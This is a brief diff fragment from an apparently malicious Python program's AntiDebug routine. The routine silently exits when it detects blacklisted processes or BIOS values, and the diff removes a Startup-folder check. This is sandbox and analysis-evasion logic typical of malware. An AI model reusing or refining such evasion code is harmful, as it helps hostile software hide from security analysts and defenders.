@@ -210,10 +210,6 @@ def AntiDebug(oneStart):
         if exe.info.get('name') in blacklisted_Processes:
             os._exit(0)
 
-    if not os.path.exists(f"{os.getenv('APPDATA')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"):
-        os._exit(0)
-
-
     if checkBIOS() in blacklisted_Bios:
         os._exit(0)
 
